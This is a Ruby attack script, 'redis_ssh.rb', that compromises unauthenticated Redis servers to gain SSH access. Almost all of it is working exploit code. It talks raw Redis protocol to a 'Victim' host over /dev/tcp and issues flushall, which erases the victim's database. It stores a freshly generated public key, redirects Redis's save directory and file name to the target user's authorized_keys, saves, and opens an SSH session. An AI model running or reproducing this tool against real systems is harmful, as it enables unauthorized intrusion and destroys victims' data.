require 'optparse'

#Write banner
puts <<-'EOF'
 _____          _ _        _____ _____ _    _ 
|  __ \        | (_)      / ____/ ____| |  | |
| |__) |___  __| |_ ___  | (___| (___ | |__| |
|  _  // _ \/ _  | / __|  \___ \\___ \|  __  |
| | \ \  __/ (_| | \__ \  ____) |___) | |  | |
|_|  \_\___|\__,_|_|___/ |_____/_____/|_|  |_|

By Levitating
https://github.com/LevitatingBusinessMan/redis-ssh

Version 0.0.1

EOF

#Reference: https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

@opts = {port: "6379", timeout: "1", sshport: "22"}
OptionParser.new do |parser|
	parser.banner = "Usage: redis_ssh.rb [options]"

	parser.on("-h", "--host HOST", /.*\..*/, "Victim") do |host|
		@opts[:host] = host
	end
	parser.on("-p", "--port PORT", /.*\..*/, "Port (default: 6379)") do |host|
		@opts[:host] = host
	end
	parser.on("-v", "--[no-]verbose", "Run verbosely") do |v|
		@opts[:verbose] = v
	end
	parser.on("-t", "--timeout TIME", "Time to wait for packets (default: 1)") do |t|
		@opts[:timeout] = t
	end
	parser.on("-u", "--user USER", "User to try and compromise") do |u|
		@opts[:user] = u
	end
	parser.on("-d", "--dir DIR", ".ssh directory to use") do |d|
		@opts[:dir] = d
	end
	parser.on("-s", "--sshport PORT", "Port to ssh to (default: 22)") do |s|
		@opts[:sshport] = s
	end
	parser.on(nil, "--help", "Print this help") do
        puts parser
        exit
    end
end.parse!

class Log

	def self.info msg
		print "\e[34m[info]\e[0m "
		p msg
	end

	def self.succ msg
		print "\e[32m[succ]\e[0m "
		p msg
	end

	def self.warn msg
		print "\e[93m[warn]\e[0m "
		p msg
	end

	def self.err msg
		print "\e[31m[err]\e[0m "
		p msg
	end

	def self.req msg
		print "\e[31m[>>]\e[0m "
		p msg
	end
	
	def self.res msg
		print "\e[32m[<<]\e[0m "
		p msg
	end

end

def send msg
	Log.req msg if @opts[:verbose]
	`exec 5<>/dev/tcp/#{@opts[:host]}/#{@opts[:port]} && printf '#{msg}\n' >&5 && timeout #{@opts[:timeout]} cat <&5`
	
	#`echo "#{msg}" | timeout --preserve-status 1 nc #{@opts[:host]} #{@opts[:port]}`
end

# Check if netcat is present
#return puts("NetCat is not installed") if !system("which nc > /dev/null 2>&1")

Log.info "When this script fails increasing the timeout may help."

=begin #Check if up
Log.info "Check if #{@opts[:host]} is accessible"
# Because the status code isn't 0 when the host doesnt not respond with anything we allow all non 1 exit codes
return Log.err " #{@opts[:host]}:#{@opts[:port]} not responding" if
`timeout --preserve-status #{@opts[:timeout]} sh -c 'cat < /dev/tcp/#{@opts[:host]}/#{@opts[:port]}' > /dev/null 2>&1; echo $?` == "1\n"
=end

=begin # Check if unauthenticated
Log.info "Checking if Authentication is required"
out =  send "echo test"
Log.res out if @opts[:verbose]
return Log.err "Host #{@opts[:host]}:#{@opts[:port]} did not accept command" if out != "$4\r\ntest\r\n"
=end

# Checking if we can set a key
Log.info "Checking if we can set a key"
out = send "set foo bar"
Log.res out if @opts[:verbose]
return Log.err "Failed to save value on the server" if out != "+OK\r\n"

# Generate ssh keypair
Log.info "Generating new ssh keypair"
return Log.err "Error generating keypair" if `ssh-keygen -t rsa -N "" -q -f /tmp/key -C redis@#{@opts[:host]} <<< y; echo $?`[-2] == "1"
pubkey = File.open("/tmp/key.pub").read
return Log.err "Error generating keypair: " + pubkey if !pubkey.start_with? "ssh-rsa"

# Checking if we can set a key
Log.info "Attempt to flush database"
out = send "flushall"
Log.res out if @opts[:verbose]
Log.warn "Failed to flush the database" if out != "+OK\r\n"

# Saving pkey value
Log.info "Saving public key as value"
# After struggling for like an hour on this I found the only way to send a multiline is by like this (following protocl strictly)
opendesc = "exec 5<>/dev/tcp/#{@opts[:host]}/#{@opts[:port]}"
escaped_string = "*3\r\n\$3\r\nset\r\n\$4\r\npkey\r\n\$#{pubkey.length + 4}\r\n#{"\n\n" + pubkey + "\n\n"}\r\n"
out = send escaped_string
Log.res out if @opts[:verbose]
return Log.err "Failed to save key on the server" if out != "+OK\r\n"

Log.info "Reading configuration directory"
out = send "config get dir"
Log.res out if @opts[:verbose]
if !out.start_with?("*2\r\n$3\r\ndir\r\n")
	Log.warn "Unable to read config dir, using defaults"
	@opts[:user] = "redis"
	@opts[:dir] = "/var/lib/redis"
else
	dir = out.split("\r\n")[4]
	Log.info "Config directory found: #{dir}"
	dirarr = dir.split("/").reject{|x|x.empty?}
	if dirarr[0] == "home"
		user = dirarr[1]
		@opts[:user] = user
		Log.succ "Config reveals user '#{user}', using '/home/#{user}/.ssh'"
		@opts[:dir] = "/home/#{user}/.ssh"
	else
		Log.warn "Defaulting to user 'redis' with home '/var/lib/redis/.ssh'"
		@opts[:user] = "redis"
		@opts[:dir] = "/var/lib/redis/.ssh"
	end
end

Log.info "Setting configuration directory"
out = send "config set dir #{@opts[:dir]}"
Log.res out if @opts[:verbose]
return Log.err "Failed to change config directory" if out != "+OK\r\n"

Log.info "Change database file to authorized_keys"
out = send "config set dbfilename authorized_keys"
Log.res out if @opts[:verbose]
return Log.err "Failed to change config directory" if out != "+OK\r\n"

Log.info "Saving database"
out = send "save"
Log.res out if @opts[:verbose]
return Log.err "Failed to save database" if out != "+OK\r\n"

Log.info "Running ssh"
exec "ssh -i /tmp/key #{@opts[:user]}@#{@opts[:host]} -p #{@opts[:sshport]}"
